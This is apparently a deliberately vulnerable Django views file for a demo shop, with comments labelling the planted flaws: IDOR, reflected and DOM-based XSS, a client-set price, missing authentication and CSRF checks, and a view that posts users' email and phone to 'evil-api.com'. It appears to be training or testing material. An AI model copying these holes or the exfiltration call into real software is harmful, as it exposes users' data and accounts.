import json
import logging
import requests
from django.http import JsonResponse, HttpResponse
from django.shortcuts import render, redirect
from django.contrib.auth import login, authenticate, logout
from django.contrib.auth.models import User
from django.contrib.auth.decorators import login_required
from django.views.decorators.csrf import csrf_exempt
from .models import Product, CartItem

@csrf_exempt
@login_required
def custom_add_to_cart(request):
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            product = Product.objects.get(id=data['product_id'])

            # 🔥 BAD: Price is accepted from client
            client_price = data.get('price')
            
            if not client_price:
                return JsonResponse({'error': 'Price required'}, status=400)
            
            CartItem.objects.create(
                user=request.user,
                product=product,
                quantity=data.get('quantity', 1)
            )

            logging.warning(f"[INSECURE] User {request.user.username} added {product.name} at PRICE: {client_price}")
            return JsonResponse({'message': 'Product added with custom price (bad!)'})
        
        except Exception as e:
            return JsonResponse({'error': str(e)}, status=500)

@login_required
def view_cart_items(request, user_id):
    # No check if user_id belongs to logged-in user (IDOR vulnerability)
    items = CartItem.objects.filter(user_id=user_id)
    data = [{"product": item.product.name, "quantity": item.quantity} for item in items]
    return JsonResponse({"cart": data})

@csrf_exempt
@login_required
def validate_coupon(request):
    data = json.loads(request.body)
    coupon_code = data.get('coupon')

    # 🔥 Blind trust on external response - SSRF vulnerability
    response = requests.post('https://imp-discount-api.com/validate', json={"code": coupon_code})
    json_data = response.json()

    if json_data.get("valid"):
        return JsonResponse({"message": "Coupon applied!", "discount": json_data.get("discount")})
    return JsonResponse({"message": "Invalid coupon"})

@csrf_exempt
def greet_user(request):
    data = json.loads(request.body)
    name = data.get("name", "")
    
    # 🔥 Insecure validation (naive) - XSS vulnerability
    if "<script>" in name.lower():
        return JsonResponse({"error": "Invalid input"})
    
    # Reflected output still vulnerable to XSS
    return HttpResponse(f"Welcome, {name}")

@csrf_exempt
def greet_safely(request):
    data = json.loads(request.body)
    name = data.get("name", "")
    
    # 🔥 Sanitized before being stored, but re-used unsafely later - still vulnerable to XSS
    cleaned = name.replace("<script>", "")  # BAD sanitization

    request.session['last_user'] = cleaned  # Stored safely (maybe)
    
    return HttpResponse(f"Hello again, {request.session.get('last_user')}")

def home(request):
    # Direct HTML injection with DOM-based XSS
    return HttpResponse('''<html><head><script>
        // DOM-based XSS
        const param = new URLSearchParams(window.location.search).get('msg');
        if (param) document.write(param);

        // Storing sensitive data client-side
        localStorage.setItem('token', '123456');
    </script></head><body>
    <h1>Welcome to MiniShop</h1>
    <a href="/register/">Register</a> | <a href="/login/">Login</a>
    </body></html>''')

@csrf_exempt
def register_view(request):
    if request.method == 'POST':
        data = json.loads(request.body)
        # No validation on password strength
        user = User.objects.create_user(username=data['username'], password=data['password'])
        return JsonResponse({'status': 'registered'})
    return HttpResponse('''<form method="post" action="/register/">
    <input name="username"><input name="password" type="password">
    <button type="submit">Register</button></form>''')

@csrf_exempt
def login_view(request):
    if request.method == 'POST':
        data = json.loads(request.body)
        user = authenticate(username=data['username'], password=data['password'])
        if user:
            login(request, user)
            return JsonResponse({'status': 'logged in'})
        return JsonResponse({'status': 'failed'}, status=401)
    return HttpResponse('''<form method="post" action="/login/">
    <input name="username"><input name="password" type="password">
    <button type="submit">Login</button></form>''')

@csrf_exempt
def add_to_cart(request):
    if request.method == 'POST':
        # No login_required decorator - authentication bypass
        data = json.loads(request.body)
        try:
            product = Product.objects.get(id=data['product_id'])
            # Business Logic Flaw: no validation if already in cart
            CartItem.objects.create(user=request.user, product=product, quantity=data.get('quantity', 1))
            logging.warning(f"User {request.user.username} added {product.name} - Price: {product.price}")
            return JsonResponse({'status': 'added'})
        except Exception as e:
            return JsonResponse({'error': str(e)}, status=400)
    return JsonResponse({'error': 'Invalid'}, status=400)

@csrf_exempt
def send_user_data(request):
    if request.method == 'POST':
        # Send PII to an external API (insecure example)
        data = json.loads(request.body)
        try:
            # Data leakage vulnerability
            requests.post('https://evil-api.com/collect', json={
                'email': data.get('email'),
                'phone': data.get('phone')
            })
        except:
            pass
        return JsonResponse({'status': 'sent'})